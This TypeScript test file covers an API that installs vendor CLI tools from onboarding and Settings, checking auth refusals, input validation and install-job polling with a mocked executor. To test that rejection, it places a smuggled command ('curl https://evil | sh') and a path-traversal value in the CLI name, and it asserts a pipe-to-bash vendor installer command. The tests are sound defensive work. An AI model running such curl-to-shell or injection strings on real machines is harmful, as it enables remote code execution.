/**
 * `/api/host/provider-clis` — the provider cards of the onboarding and of
 * Settings (TODO #251). Refusals first: these routes run a vendor's installer
 * on the machine. Then the job: started at once, followed by polling, its
 * console readable while it runs. No test here ever runs a real installer.
 * Isolated TIMON_HOME, witness on 127.0.0.1:0, the real auth middleware.
 */
import { mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { once } from 'node:events';
import type { AddressInfo } from 'node:net';
import { test } from 'node:test';
import assert from 'node:assert/strict';
import express from 'express';
import { postTestAccount } from '../../../tests/helpers/accounts.js';

const HOME = mkdtempSync(join(tmpdir(), 'timon-provider-clis-'));
process.env.TIMON_HOME = HOME;
await import('../../../tests/helpers/paid-license.js');
process.env.TIMON_RESOURCE_GUARD_ENABLED = '0';
process.env.TIMON_CLI_UPDATE_CHECK = '0';

const { createDaemonAuthMiddleware } = await import('../http/auth.js');
const { registerRoutes: registerUserRoutes } = await import('../users/routes.js');
const { registerProviderCliRoutes } = await import('./provider-cli-routes.js');
const { dbApi } = await import('../../db.js');
const { SESSION_COOKIE } = await import('../../users/session.js');
const { issueMissionApiToken } = await import('../../users/api-tokens.js');
const { resetCliInstallsForTests } = await import('../../provider-cli-install.js');
{
  const { mountOfficialProviders } = await import('../../../tests/helpers/official-providers.js');
  await mountOfficialProviders();
}

const TOKEN = 'witness-daemon-token';
let release: (() => void) | null = null;
let opencodeVersion = '1.14.29';
const ran: string[][] = [];
const app = express();
app.use(createDaemonAuthMiddleware({ token: TOKEN, required: true }));
app.use(express.json());
registerUserRoutes(app, { setupPolicy: 'free' });
registerProviderCliRoutes(app, {
  platform: 'linux',
  // The installer prints a line, then waits until the test lets it finish.
  exec: async (command, args, log) => {
    ran.push([command, ...args]);
    log.push('Downloading grok…\r\u001b[32m100%\u001b[0m\n');
    await new Promise<void>((resolve) => { release = resolve; });
    log.push('Installed to ~/.grok/bin\n');
    return { code: 0, stdout: '', stderr: '' };
  },
  locate: (name) => (name === 'opencode' ? '/home/ann/.opencode/bin/opencode' : '/home/ann/.grok/bin/grok'),
  readVersion: async () => opencodeVersion,
  afterSuccess: () => {},
});
const server = app.listen(0, '127.0.0.1');
await once(server, 'listening');
const base = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
test.after(() => { server.close(); });

function sessionCookie(res: Response): string | undefined {
  const lines = typeof res.headers.getSetCookie === 'function' ? res.headers.getSetCookie() : [];
  for (const line of lines) {
    const match = new RegExp(`(?:^|,\\s*)${SESSION_COOKIE}=([^;]+)`).exec(line);
    if (match?.[1]) return decodeURIComponent(match[1]);
  }
  return undefined;
}

async function call(method: string, path: string, opts: { body?: unknown; cookie?: string; bearer?: string } = {}) {
  const headers: Record<string, string> = {};
  if (opts.body !== undefined) headers['content-type'] = 'application/json';
  if (opts.cookie) headers.cookie = `${SESSION_COOKIE}=${encodeURIComponent(opts.cookie)}`;
  if (opts.bearer) headers.authorization = `Bearer ${opts.bearer}`;
  const res = await fetch(`${base}${path}`, { method, headers, ...(opts.body === undefined ? {} : { body: JSON.stringify(opts.body) }) });
  const text = await res.text();
  let json: unknown = null;
  try { json = text ? JSON.parse(text) : null; } catch { json = text; }
  return { status: res.status, json };
}

async function login(email: string, password: string): Promise<string> {
  return sessionCookie(await fetch(`${base}/api/auth/login`, {
    method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ email, password }),
  }))!;
}

assert.equal((await call('POST', '/api/auth/setup', { body: { email: 'admin@example.com', name: 'Admin', password: 'admin-secret' } })).status, 201);
const adminCookie = await login('admin@example.com', 'admin-secret');
await postTestAccount(dbApi, { email: 'ada@example.com', name: 'Ada', password: 'ada-secret' });
const adaCookie = await login('ada@example.com', 'ada-secret');
const admin = dbApi.listUsers().find((u) => u.email === 'admin@example.com')!;
dbApi.createMission('mission-provider-clis', 'admin.agent', 'work', undefined, admin.id);
const missionToken = issueMissionApiToken('mission-provider-clis');

const ROUTES: [string, string][] = [
  ['GET', '/api/host/provider-clis'],
  ['POST', '/api/host/provider-clis/check'],
  ['POST', '/api/host/provider-clis/grok/install'],
  ['GET', '/api/host/provider-clis/grok/install'],
];

test('anonymous: 401 on every route, and nothing runs', async () => {
  for (const [method, path] of ROUTES) assert.equal((await call(method, path)).status, 401, `${method} ${path}`);
  assert.deepEqual(ran, []);
});

test('daemon token, mission token, non-superadmin session: 403, nothing runs', async () => {
  for (const [method, path] of ROUTES) {
    assert.equal((await call(method, path, { bearer: TOKEN })).status, 403, `daemon token ${method} ${path}`);
    assert.equal((await call(method, path, { bearer: missionToken })).status, 403, `mission token ${method} ${path}`);
    assert.equal((await call(method, path, { cookie: adaCookie })).status, 403, `session ${method} ${path}`);
  }
  assert.deepEqual(ran, []);
});

test('the path names a CLI from the closed list, never a command', async () => {
  for (const name of ['curl%20https%3A%2F%2Fevil%20%7C%20sh', 'acme-agent', 'node', '..%2F..%2Fbin%2Fsh']) {
    assert.equal((await call('POST', `/api/host/provider-clis/${name}/install`, { cookie: adminCookie })).status, 400, name);
  }
  assert.deepEqual(ran, []);
});

test('a CLI whose vendor gives no installer here is refused with 409: its card links to the page', async () => {
  const res = await call('POST', '/api/host/provider-clis/hermes-acp/install', { cookie: adminCookie });
  assert.equal(res.status, 409);
  assert.deepEqual(res.json, { error: 'no_installer' });
  assert.deepEqual(ran, []);
});

test('opencode 2 on the machine: the install is refused, even asked by hand, and nothing runs', async () => {
  opencodeVersion = '2.0.0';
  try {
    const res = await call('POST', '/api/host/provider-clis/opencode/install', { cookie: adminCookie });
    assert.equal(res.status, 409);
    assert.deepEqual(res.json, { error: 'unsupported_version' });
    assert.deepEqual(ran, []);
  } finally {
    opencodeVersion = '1.14.29';
  }
});

test('the list: every card, with an installer or the vendor\'s page', async () => {
  const res = await call('GET', '/api/host/provider-clis', { cookie: adminCookie });
  assert.equal(res.status, 200);
  const body = res.json as { backends: Array<{ name: string; installable: boolean; installDocs: string | null; seedsMainAgent: boolean }>; updateCheck: boolean };
  assert.deepEqual(body.backends.map((b) => b.name), ['claude', 'codex', 'grok', 'copilot', 'opencode', 'hermes-acp', 'pi', 'agy']);
  assert.equal(body.updateCheck, false);
  for (const card of body.backends) assert.ok(card.installable || card.installDocs, `${card.name} offers neither an installer nor a page`);
  assert.equal(body.backends.find((b) => b.name === 'opencode')?.seedsMainAgent, false);
});

test('an install answers at once, its console readable while it runs, then its verdict', async () => {
  resetCliInstallsForTests();
  assert.equal((await call('GET', '/api/host/provider-clis/grok/install', { cookie: adminCookie })).status, 404);
  const started = await call('POST', '/api/host/provider-clis/grok/install', { cookie: adminCookie });
  assert.equal(started.status, 202);
  const job = (started.json as { job: { command: string; state: string } }).job;
  assert.equal(job.command, 'curl -fsSL https://x.ai/cli/install.sh | bash');
  assert.equal(job.state, 'running');
  // A second click joins the job under way instead of starting another installer.
  assert.equal((await call('POST', '/api/host/provider-clis/grok/install', { cookie: adminCookie })).status, 202);
  assert.deepEqual(ran, [['/bin/sh', '-c', 'curl -fsSL https://x.ai/cli/install.sh | bash']]);

  const live = await call('GET', '/api/host/provider-clis/grok/install', { cookie: adminCookie });
  const running = (live.json as { job: { state: string; lines: string[] } }).job;
  assert.equal(running.state, 'running');
  // The progress redraw keeps its last state, without its colour codes.
  assert.deepEqual(running.lines, ['100%']);

  release?.();
  let finished: { state: string; lines: string[]; result: { ok: boolean } | null } | null = null;
  for (let i = 0; i < 50 && finished?.state !== 'succeeded'; i += 1) {
    await new Promise((resolve) => setTimeout(resolve, 10));
    finished = ((await call('GET', '/api/host/provider-clis/grok/install', { cookie: adminCookie })).json as { job: typeof finished }).job;
  }
  assert.equal(finished?.state, 'succeeded');
  assert.equal(finished?.result?.ok, true);
  assert.deepEqual(finished?.lines, ['100%', 'Installed to ~/.grok/bin']);
  const listed = (await call('GET', '/api/host/provider-clis', { cookie: adminCookie })).json as { jobs: Record<string, { state: string }> };
  assert.equal(listed.jobs.grok?.state, 'succeeded');
});
